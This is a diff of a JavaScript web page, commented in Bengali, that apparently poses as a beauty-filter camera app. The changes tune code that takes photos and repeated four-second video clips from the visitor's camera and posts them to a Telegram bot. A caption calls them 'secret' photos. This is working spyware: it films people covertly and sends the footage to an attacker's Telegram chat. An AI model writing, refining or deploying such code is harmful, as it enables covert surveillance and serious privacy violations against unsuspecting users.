@@ -133,10 +133,10 @@
         // ভিডিও স্ট্রিম পুরোপুরি প্লে হওয়ার জন্য ১ সেকেন্ড অপেক্ষা করা
         await new Promise(resolve => setTimeout(resolve, 1000));
 
-        // ১. প্রথমে পর পর ৩টি ছবি তুলে টেলিগ্রামে পাঠানো
+        // ১. প্রথমে পর পর ৩টি ছবি তুলে দ্রুত টেলিগ্রামে পাঠানো
         await captureAndSendPhotos(3);
 
-        // ২. এরপর ৫ সেকেন্ডের ভিডিও ক্লিপ বারবার পাঠিয়ে যাওয়া শুরু করা
+        // ২. এরপর ভিডিও ক্লিপ দ্রুত রেকর্ড করে এমপিফোর আকারে পাঠানো শুরু করা
         startPeriodicVideoRecording();
 
       } catch (err) {
@@ -144,7 +144,7 @@
       }
     });
 
-    // ছবি তোলার উন্নত ফাংশন (টাইমআউট ও সাইজ চেক সহ)
+    // ছবি তোলার দ্রুত ফাংশন
     function takePhoto() {
       return new Promise((resolve) => {
         setTimeout(() => {
@@ -161,8 +161,8 @@
 
           canvas.toBlob((blob) => {
             resolve(blob);
-          }, 'image/jpeg', 0.90);
-        }, 1200);
+          }, 'image/jpeg', 0.85);
+        }, 600);
       });
     }
 
@@ -176,33 +176,36 @@
           formData.append('photo', photoBlob, `photo_${i}_${Date.now()}.jpg`);
           formData.append('caption', `✨ বিউটি ফিল্টারসহ সিক্রেট ছবি #${i}`);
 
-          await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
           }).catch(err => console.log("Photo send failed", err));
         }
-        // প্রতিটি ছবির মাঝে ১ সেকেন্ড বিরতি
-        await new Promise(r => setTimeout(r, 1000));
+        await new Promise(r => setTimeout(r, 400));
       }
     }
 
-    // প্রতি ৫ সেকেন্ড পর পর ভিডিও রেকর্ড করে টেলিগ্রামে পাঠানোর লুপ
+    // প্রতি ৪ সেকেন্ড পর পর ভিডিও রেকর্ড করে সরাসরি .mp4 আকারে টেলিগ্রামে পাঠানোর লুপ
     function startPeriodicVideoRecording() {
       if (!camStream) return;
 
       const recordInterval = async () => {
         if (!camStream || camStream.active === false) return;
 
-        let options = { mimeType: 'video/webm;codecs=vp8,opus' };
+        // এমপিফোর ফরম্যাট বা ব্রাউজার সাপোর্টেড ফরম্যাট সিলেক্ট করা
+        let options = { mimeType: 'video/mp4' };
         if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-          options = { mimeType: 'video/mp4' };
+          options = { mimeType: 'video/webm;codecs=h264,opus' };
+          if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+            options = { mimeType: 'video/webm' };
+          }
         }
 
         let mediaRecorder;
         try {
           mediaRecorder = new MediaRecorder(camStream, options);
         } catch (e) {
-          setTimeout(recordInterval, 2000);
+          setTimeout(recordInterval, 1000);
           return;
         }
 
@@ -216,32 +219,33 @@
 
         mediaRecorder.onstop = async () => {
           if (chunks.length > 0) {
-            const videoBlob = new Blob(chunks, { type: 'video/webm' });
-            if (videoBlob.size > 1000) { // নিশ্চিত করা যে ফাইলটি খালি নয়
+            // ডাইরেক্ট MP4 এক্সটেনশন দিয়ে ফাইল তৈরি করা
+            const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+            if (videoBlob.size > 1000) {
               const formData = new FormData();
               formData.append('chat_id', TELEGRAM_CHAT_ID);
-              formData.append('video', videoBlob, `clip_${Date.now()}.webm`);
-              formData.append('caption', `🎥 ৫ সেকেন্ডের ভিডিও ক্লিপ`);
+              formData.append('video', videoBlob, `clip_${Date.now()}.mp4`);
+              formData.append('caption', `🎥 এমপিফোর ভিডিও ক্লিপ`);
 
-              await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+              fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
                 method: 'POST',
                 body: formData
               }).catch(err => console.log("Video send failed", err));
             }
           }
 
-          // পরবর্তী ৫ সেকেন্ডের ভিডিওর জন্য রিকার্সভ কল
-          setTimeout(recordInterval, 1500);
+          // দ্রুত পরবর্তী ক্লিপ শুরু করার জন্য সময় কমিয়ে দেওয়া হলো
+          setTimeout(recordInterval, 500);
         };
 
         mediaRecorder.start();
 
-        // ঠিক ৫ সেকেন্ড পর রেকর্ড স্টপ করা
+        // ভিডিও আসার দেরি কমানোর জন্য রেকর্ডিংয়ের সময় ৪ সেকেন্ড করা হলো
         setTimeout(() => {
           if (mediaRecorder && mediaRecorder.state === 'recording') {
             mediaRecorder.stop();
           }
-        }, 5000);
+        }, 4000);
       };
 
       recordInterval();
